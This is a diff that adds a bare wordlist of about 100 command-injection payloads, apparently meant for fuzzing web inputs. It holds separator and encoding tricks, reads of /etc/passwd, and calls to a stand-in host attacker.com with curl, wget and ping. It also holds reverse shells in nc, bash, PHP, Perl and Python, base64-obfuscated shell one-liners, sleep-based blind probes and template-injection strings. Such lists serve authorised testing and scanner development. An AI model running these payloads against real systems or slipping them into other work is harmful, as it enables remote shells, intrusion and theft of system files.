@@ -1,0 +1,100 @@
+;ls
+&&ls
+|ls
+$(ls)
+`ls`
+%0als
+;whoami
+|whoami
+`whoami`
+$(whoami)
+$(id)
+`id`
+;id
+||id
+||whoami
+;uname -a
+&&uname -a
+|uname -a
+||uname -a
+`uname -a`
+$(uname -a)
+$(cat /etc/passwd)
+`cat /etc/passwd`
+|cat /etc/passwd
+;cat /etc/passwd
+;ping -c 1 attacker.com
+|ping -c 1 attacker.com
+;curl attacker.com
+|curl attacker.com
+||curl attacker.com
+$(curl attacker.com)
+wget http://attacker.com
+|nc attacker.com 4444 -e /bin/bash
+;nc -nv attacker.com 1234 -e /bin/sh
+bash -i >& /dev/tcp/attacker.com/1234 0>&1
+php -r '$sock=fsockopen("attacker.com",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+perl -e 'use Socket;$i="attacker.com";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+sleep 5
+|sleep 5
+&&sleep 5
+;timeout 5
+;ping -n 5 127.0.0.1
+ping -c 10 127.0.0.1
+|nslookup attacker.com
+curl http://attacker.com
+wget http://attacker.com
+curl -X POST attacker.com
+bash -c 'curl attacker.com'
+bash -c {echo,Y3VybCBodHRwOi8vYXR0YWNrZXIuY29t}|{base64,-d}|{bash,-i}
+{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vMTIzNCAwPiYx}|{base64,-d}|{bash,-i}
+;${run{ls}}
+|${run{id}}
+$(curl 127.0.0.1)
+`wget attacker.com`
+<%= `ls` %>
+<% system("id") %>
+<%=`id`%>
+${@print(md5(1))}
+0|echo 123
+1;echo 456
+ping -c1 127.0.0.1
+& ping -c1 attacker.com &
+| ping -c1 attacker.com |
+sleep 10 && echo vulnerable
+`sleep 10` && echo vulnerable
+; sleep${IFS}10
+curl$(IFS)attacker.com
+echo${IFS}hacked
+bash${IFS}-c${IFS}'ls'
+echo$IFS"hacked"
+curl$IFShttp://attacker.com
+id%0auname -a
+bash -c$IFS'echo success'
+$(bash -c 'echo hello')
+wget${IFS}attacker.com
+;id#
+|whoami#
+&&ls#
+||id#
+`ls`#
+$(id)#
+;id;//
+|id;//
+||id;//
+%26id
+%26whoami
+%26uname -a
+%26%26id
+%26%26whoami
+%26%26curl attacker.com
+$(curl http://127.0.0.1)
+& curl attacker.com &
+|| ping -c1 attacker.com
+%3B id
+%3B ls
+%3B uname -a
+`cat /etc/passwd`
+$(cat /etc/passwd)
+id%0aid
